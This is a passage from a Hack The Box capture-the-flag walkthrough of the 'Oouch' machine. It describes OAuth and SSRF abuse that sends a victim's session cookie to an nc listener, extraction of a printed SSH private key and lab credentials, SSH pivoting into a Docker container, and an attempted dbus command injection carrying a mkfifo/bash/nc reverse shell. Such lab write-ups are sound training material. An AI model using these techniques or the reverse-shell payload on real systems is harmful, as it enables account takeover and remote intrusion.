on our screen!! Cool</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/image-10.png" alt="SSRF" /></p><p>After clicking on in i am logged in as <code class="language-plaintext highlighter-rouge">qtc</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/image-11.png" alt="Logging as qtc" /></p><h2 id="documents-of-qtc">Documents of qtc</h2><p>We can access <code class="language-plaintext highlighter-rouge">qtc</code> Documents now that re in /Documents dir</p><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>dev_access.txt<td>develop:supermegasecureklarabubu123! -&gt; Allows application registration.<tr><td>o_auth_notes.txt<td>/api/get_user -&gt; user data. oauth/authorize -&gt; Now also supports GET method.<tr><td>todo.txt<td>Chris mentioned all users could obtain my ssh key. Must be a joke…</table></div><p>The above details were in a table type syntax.</p><p>We can conclude some points from the documents</p><ul><li>the credentials we got maybe used for sometype registration<li>there is an api which contains users data<li>And the ssh key of user is stored in unsecured way on website somewhere</ul><h2 id="dirb-recursive-search">Dirb recursive search</h2><p>I ran a dirb recursive search on the <code class="language-plaintext highlighter-rouge">http://authorization.oouch.htb:8000/</code> To check for Hidden dirs.</p><p>And after some hit and trials i got the dir</p><p><code class="language-plaintext highlighter-rouge">/oauth/applications/register</code></p><h2 id="registering-for-application">Registering for application</h2><p>We got a login page</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/image-12.png" alt="Loging page" /></p><p>We can use the credentials we got from <code class="language-plaintext highlighter-rouge">qtc</code> <code class="language-plaintext highlighter-rouge">Documents</code></p><p><code class="language-plaintext highlighter-rouge">develop:supermegasecureklarabubu123!</code></p><p>And we got logged in,And got a application</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/image-13.png" alt="Application registration" /></p><p>i Registered a new application with the following details</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/image-14.png" alt="Application" /></p><h2 id="getting-sessionid-of-qtc">Getting sessionid of qtc</h2><p>And i tried to access the application via its name but i was failed Then i tried to access the application via parameters that we selected during creating the application</p><p>Likewise i can access the application i made using</p><blockquote><p>http://authorization.oouch.htb:8000/oauth/authorize/?client_id=7ZLCaJIn9NzEQ081RCpkk6rLwc7aJmYZGDmfvhsn&amp;redirect_uri=http://10.10.14.21:4444&amp;grant_type=authorization_code&amp;client_secret=xSxBgeE6uzDfT2cx4vnHDIygiLlwyI65aMYC6pzR77HaNSi7GhhLZmoRsKZJQ3vHOcRI7VeO2wVnWd56AhucNeBL1KgOLGdbRKy5B5dgxvWIbFWrUjAJS3oDYJ3EGqdn</p></blockquote><p>To test the url i paste the url in my browser and started my nc listener on port 4444 And it got hitted</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>➜  prashant git:<span class="o">(</span>master<span class="o">)</span> ✗ nc <span class="nt">-nlvp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.21] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.14.21] 60280
GET /?error<span class="o">=</span>invalid_request&amp;error_description<span class="o">=</span>Missing+response_type+parameter. HTTP/1.1
Host: 10.10.14.21:4444
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> Linux x86_64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/80.0.3987.122 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/webp,image/apng,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,application/signed-exchange<span class="p">;</span><span class="nv">v</span><span class="o">=</span>b3<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9
Accept-Encoding: <span class="nb">gzip</span>, deflate
Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9
Connection: close
</pre></table></code></div></div><p>Now its time for <code class="language-plaintext highlighter-rouge">ssrf</code> again we have to paste the url in the contact page and we will the cookies of the user <code class="language-plaintext highlighter-rouge">qtc</code> and then we can use the cookies to login as <code class="language-plaintext highlighter-rouge">qtc</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/image-15.png" alt="Sessionid" /></p><p>And after few seconds we got the cookies on our nc listener</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>➜  prashant git:<span class="o">(</span>master<span class="o">)</span> ✗ nc <span class="nt">-nlvp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.21] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.177] 40134
GET /?error<span class="o">=</span>invalid_request&amp;error_description<span class="o">=</span>Missing+response_type+parameter. HTTP/1.1
Host: 10.10.14.21:4444
User-Agent: python-requests/2.21.0
Accept-Encoding: <span class="nb">gzip</span>, deflate
Accept: <span class="k">*</span>/<span class="k">*</span>
Connection: keep-alive
Cookie: <span class="nv">sessionid</span><span class="o">=</span>dvd11o5h4jbzs9m5c0xieh9ds0c298ll<span class="p">;</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">Cookie: sessionid=dvd11o5h4jbzs9m5c0xieh9ds0c298ll</code></p><p>I am using a <code class="language-plaintext highlighter-rouge">cookie editor</code>,Its a chrome extension you can get it here <a href="https://chrome.google.com/webstore/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm?hl=en">Cookie-editor</a></p><p>Paste the session id u got in the cookie-editor and refresh the page.And i m logged in as qtc</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/image-16.png" alt="QTC" /></p><h2 id="getting-access-token-to-access-api">Getting access token to access api</h2><p>We are logged in as <code class="language-plaintext highlighter-rouge">qtc</code> Now.Now our aim is to get access to api.For accessing api we need to get a access token.And we can get that by making a POST request to <code class="language-plaintext highlighter-rouge">http://authorization.oouch.htb:8000/oauth/token/</code> using <code class="language-plaintext highlighter-rouge">curl</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>curl <span class="nt">-X</span> POST <span class="s1">'http://authorization.oouch.htb:8000/oauth/token/'</span> <span class="nt">-H</span> <span class="s2">"Content-Type: application/x-www-form-urlencoded"</span> <span class="nt">--data</span> <span class="s2">"grant_type=client_credentials&amp;client_id=7ZLCaJIn9NzEQ081RCpkk6rLwc7aJmYZGDmfvhsn&amp;client_secret=xSxBgeE6uzDfT2cx4vnHDIygiLlwyI65aMYC6pzR77HaNSi7GhhLZmoRsKZJQ3vHOcRI7VeO2wVnWd56AhucNeBL1KgOLGdbRKy5B5dgxvWIbFWrUjAJS3oDYJ3EGqdn
"</span> <span class="nt">-L</span> <span class="nt">-s</span>
</pre></table></code></div></div><p>And the response was</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">{</span><span class="s2">"access_token"</span>: <span class="s2">"LpLKz5mxCzy8mxCLPnbzhtseeXyeEK"</span>, <span class="s2">"expires_in"</span>: 600, <span class="s2">"token_type"</span>: <span class="s2">"Bearer"</span>, <span class="s2">"scope"</span>: <span class="s2">"read write"</span><span class="o">}</span><span class="c">#</span>
</pre></table></code></div></div><h2 id="getting-ssh-keys-of-qtc">Getting ssh keys of qtc</h2><p>I tried to access the /api/get_user using the token code we got but i got the same.I still cant access it.Then i tried it to <code class="language-plaintext highlighter-rouge">get_ssh</code> instead of <code class="language-plaintext highlighter-rouge">get_user</code>.</p><p>The final url in my browser was</p><p><code class="language-plaintext highlighter-rouge">http://authorization.oouch.htb:8000/api/get_ssh/?access_token=LpLKz5mxCzy8mxCLPnbzhtseeXyeEK</code></p><p>And i Got the ssh keys but it was in a very wrong format.Copied the ssh keys to my text editor</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/oouch/image-17.png" alt="SSH_keys" /></p><p>and after some editing and removing all the<code class="language-plaintext highlighter-rouge">\n</code> from the file.It was looking like this</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
</pre><td class="rouge-code"><pre><span class="nt">-----BEGIN</span> OPENSSH PRIVATE KEY-----
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
<span class="nv">IEkgsoEGTkznCbAAAADnBlbnRlc3RlckBrYWxpAQIDBA</span><span class="o">==</span>
<span class="nt">-----END</span> OPENSSH PRIVATE KEY-----
</pre></table></code></div></div><h2 id="login-as-qtc-using-ssh">Login as <code class="language-plaintext highlighter-rouge">qtc</code> using ssh</h2><p>Now i have the private ssh keys i can login as qtc by giving <code class="language-plaintext highlighter-rouge">id_rsa</code> appropirate permission</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>➜  oouch git:<span class="o">(</span>master<span class="o">)</span> ✗ <span class="nb">chmod </span>600 id_rsa
➜  oouch git:<span class="o">(</span>master<span class="o">)</span> ✗ ssh <span class="nt">-i</span> id_rsa qtc@oouch.htb 
Linux oouch 4.19.0-8-amd64 <span class="c">#1 SMP Debian 4.19.98-1 (2020-01-26) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.3
qtc@oouch:~<span class="nv">$ </span>
</pre></table></code></div></div><h1 id="got-usertxt">Got user.txt</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>qtc@oouch:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
ba7--------------------------d14
qtc@oouch:~<span class="nv">$ </span>
</pre></table></code></div></div><h1 id="privilege-escalation">Privilege escalation</h1><h2 id="login-to-docker">Login to docker</h2><p>Tried to running various <code class="language-plaintext highlighter-rouge">monitoring</code> scripts but no success.</p><p>Running <code class="language-plaintext highlighter-rouge">ps -aux</code> and <code class="language-plaintext highlighter-rouge">ss</code> gave me some interesting results that there is a docker running on the machine.</p><p>I did a command <code class="language-plaintext highlighter-rouge">ip a</code>.It <code class="language-plaintext highlighter-rouge">Displays info about all network interfaces</code> and also about the docker and its interfaces related to it.And we got the ip range on which the docker and related service is running</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre>qtc@oouch:~<span class="nv">$ </span>ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens34: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    <span class="nb">link</span>/ether 00:50:56:b9:ba:81 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.177/24 brd 10.10.10.255 scope global ens34
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:ba81/64 scope global dynamic mngtmpaddr 
       valid_lft 86117sec preferred_lft 14117sec
    inet6 fe80::250:56ff:feb9:ba81/64 scope <span class="nb">link 
       </span>valid_lft forever preferred_lft forever
3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default 
    <span class="nb">link</span>/ether 02:42:66:92:e9:2c brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-cc6c78e0c7d0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
    <span class="nb">link</span>/ether 02:42:9f:43:75:f5 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-cc6c78e0c7d0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:9fff:fe43:75f5/64 scope <span class="nb">link 
       </span>valid_lft forever preferred_lft forever
6: veth97fb0c5@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default 
    <span class="nb">link</span>/ether 12:49:7c:41:00:bb brd ff:ff:ff:ff:ff:ff link-netnsid 2
    inet6 fe80::1049:7cff:fe41:bb/64 scope <span class="nb">link 
       </span>valid_lft forever preferred_lft forever
8: vethdd01113@if7: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default 
    <span class="nb">link</span>/ether 2a:ff:b0:3c:04:92 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::28ff:b0ff:fe3c:492/64 scope <span class="nb">link 
       </span>valid_lft forever preferred_lft forever
10: veth5dad994@if9: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default 
    <span class="nb">link</span>/ether e6:bc:82:f1:c5:04 brd ff:ff:ff:ff:ff:ff link-netnsid 3
    inet6 fe80::e4bc:82ff:fef1:c504/64 scope <span class="nb">link 
       </span>valid_lft forever preferred_lft forever
12: vetha1db8fd@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-cc6c78e0c7d0 state UP group default 
    <span class="nb">link</span>/ether 02:27:bb:85:15:5f brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::27:bbff:fe85:155f/64 scope <span class="nb">link 
       </span>valid_lft forever preferred_lft forever
</pre></table></code></div></div><p>Interesting ones are</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default 
    <span class="nb">link</span>/ether 02:42:66:92:e9:2c brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-cc6c78e0c7d0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default 
    <span class="nb">link</span>/ether 02:42:9f:43:75:f5 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-cc6c78e0c7d0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:9fff:fe43:75f5/64 scope <span class="nb">link 
       </span>valid_lft forever preferred_lft forever
</pre></table></code></div></div><p>These interfaces are running on a very different ips.Docker is running on it.</p><p>I tried to login with <code class="language-plaintext highlighter-rouge">172.17.0.1</code> and the private ssh key of qtc user.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>qtc@oouch:~<span class="nv">$ </span>ssh <span class="nt">-i</span> .ssh/id_rsa qtc@172.17.0.1
The authenticity of host <span class="s1">'172.17.0.1 (172.17.0.1)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:6/ZyfRrDDz0w1+EniBrf/0LXg5sF4o5jYNEjjU32y8s.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '</span>172.17.0.1<span class="s1">' (ED25519) to the list of known hosts.
qtc@172.17.0.1: Permission denied (publickey).
qtc@oouch:~$ 
</span></pre></table></code></div></div><p>But i just logged in myself as <code class="language-plaintext highlighter-rouge">qtc</code> again on <code class="language-plaintext highlighter-rouge">oouch</code> its because the ip i entered is the gateway. And the gateway is itself the oouch….machine (My bad).</p><p>Tried with <code class="language-plaintext highlighter-rouge">172.17.0.2</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>qtc@oouch:~<span class="nv">$ </span>ssh <span class="nt">-i</span> .ssh/id_rsa qtc@172.17.0.2
ssh: connect to host 172.17.0.2 port 22: No route to host
</pre></table></code></div></div><p>And likewise i tried ips till <code class="language-plaintext highlighter-rouge">172.17.0.10</code> but no success</p><p>Then i just moved to another interface and got success on <code class="language-plaintext highlighter-rouge">172.18.0.2</code> and logged in to docker</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>qtc@oouch:~<span class="nv">$ </span>ssh <span class="nt">-i</span> .ssh/id_rsa qtc@172.18.0.2
The authenticity of host <span class="s1">'172.18.0.2 (172.18.0.2)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:ROF4hYtv6efFf0CQ80jfB60uyDobA9mVYiXVCiHlhSE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '</span>172.18.0.2<span class="s1">' (ED25519) to the list of known hosts.
Linux aeb4525789d8 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
qtc@aeb4525789d8:~$ 
</span></pre></table></code></div></div><p>Now if we go to <code class="language-plaintext highlighter-rouge">/</code> dir there is a dir called <code class="language-plaintext highlighter-rouge">code</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>drwxr-xr-x   4 root root 4096 Feb 11 17:34 code
</pre></table></code></div></div><p>The web services were running from the docker on port 5000 and 8000 <code class="language-plaintext highlighter-rouge">flask and django</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>qtc@aeb4525789d8:/code<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 52
drwxr-xr-x 4 root root 4096 Feb 11 17:34 <span class="nb">.</span>
drwxr-xr-x 1 root root 4096 Feb 25 12:33 ..
<span class="nt">-rw-r--r--</span> 1 root root 1072 Feb 11 17:34 Dockerfile
<span class="nt">-r--------</span> 1 root root  568 Feb 11 17:34 authorized_keys
<span class="nt">-rw-r--r--</span> 1 root root  325 Feb 11 17:34 config.py
<span class="nt">-rw-r--r--</span> 1 root root   23 Feb 11 17:34 consumer.py
<span class="nt">-r--------</span> 1 root root 2602 Feb 11 17:34 key
drwxr-xr-x 4 root root 4096 Feb 11 17:34 migrations
<span class="nt">-rw-r--r--</span> 1 root root  724 Feb 11 17:34 nginx.conf
drwxr-xr-x 5 root root 4096 Feb 11 17:34 oouch
<span class="nt">-rw-r--r--</span> 1 root root  241 Feb 11 17:34 requirements.txt
<span class="nt">-rwxr-xr-x</span> 1 root root   89 Feb 11 17:34 start.sh
<span class="nt">-rw-rw-rw-</span> 1 root root    0 Mar 26 08:36 urls.txt
<span class="nt">-rw-r--r--</span> 1 root root  163 Feb 11 17:34 uwsgi.ini
</pre></table></code></div></div><p>Hmmmm…interesting</p><p>There is file called <code class="language-plaintext highlighter-rouge">routes.py</code> in <code class="language-plaintext highlighter-rouge">/code/oouch/</code> it Contains some lines of code thast uses dbus and reveals the interface.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">qtc</span><span class="o">@</span><span class="n">aeb4525789d8</span><span class="p">:</span><span class="o">/</span><span class="n">code</span><span class="o">/</span><span class="n">oouch</span><span class="err">$</span> <span class="n">cat</span> <span class="n">routes</span><span class="p">.</span><span class="n">py</span> <span class="o">|</span> <span class="n">grep</span> <span class="n">dbus</span>
<span class="kn">import</span> <span class="nn">dbus</span>
            <span class="n">bus</span> <span class="o">=</span> <span class="n">dbus</span><span class="p">.</span><span class="n">SystemBus</span><span class="p">()</span>
            <span class="n">block_iface</span> <span class="o">=</span> <span class="n">dbus</span><span class="p">.</span><span class="n">Interface</span><span class="p">(</span><span class="n">block_object</span><span class="p">,</span> <span class="n">dbus_interface</span><span class="o">=</span><span class="s">'htb.oouch.Block'</span><span class="p">)</span>
</pre></table></code></div></div><p>I tried to run <code class="language-plaintext highlighter-rouge">dbus-send</code> to send reply to the dbus-interface and embeding the <code class="language-plaintext highlighter-rouge">nc-payload </code> in it,With <code class="language-plaintext highlighter-rouge">string</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>qtc@aeb4525789d8:/code/oouch<span class="nv">$ </span>dbus-send <span class="nt">--system</span> <span class="nt">--print-reply</span> <span class="nt">--dest</span><span class="o">=</span>htb.oouch.Block /htb/oouch/Block  htb.oouch.Block.Block <span class="s2">"string:;rm /tmp/.0; mkfifo /tmp/.0; cat /tmp/.0 | /bin/bash -i 2&gt;&amp;1 | nc 172.18.0.1 1234 &gt;/tmp/.0;"</span>

Error org.freedesktop.DBus.Error.AccessDenied: Rejected send message, 1 matched rules<span class="p">;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">"method_call"</span>, <span class="nv">sender</span><span class="o">=</span><span class="s2">":1.136"</span> <span class="o">(</span><span class="nv">uid</span><span class="o">=</span>1000 <span class="nv">pid</span><span class="o">=</span>4558 <span class="nb">comm</span><span class="o">=</span><span class="s2">"dbus-send --system --print-reply --dest=htb.oouch."</span><span class="o">)</span> <span class="nv">interface</span><span class="o">=</span><span class="s2">"htb.oouch.Block"</span> <span class="nv">member</span><span class="o">=</span><span class="s2">"Block"</span> error <span class="nv">name</span><span class="o">=</span><span class="s2">"(unset)"</span> <span class="nv">requested_reply</span><span class="o">=</span><span class="s2">"0"</span> <span class="nv">destination</span><span class="o">=</span><span class="s2">"htb.oouch.Block"</span> <span class="o">(</span><span class="nv">uid</span><span class="o">=</span>0 <span class="nv">pid</span><span class="o">=</span>2568 <span class="nb">comm</span><span class="o">=</span><span class="s2">"/root/dbus-server "</span><span class="o">)</span>
qtc@aeb4525789d8:/code/oouch<span class="nv">$ </span>
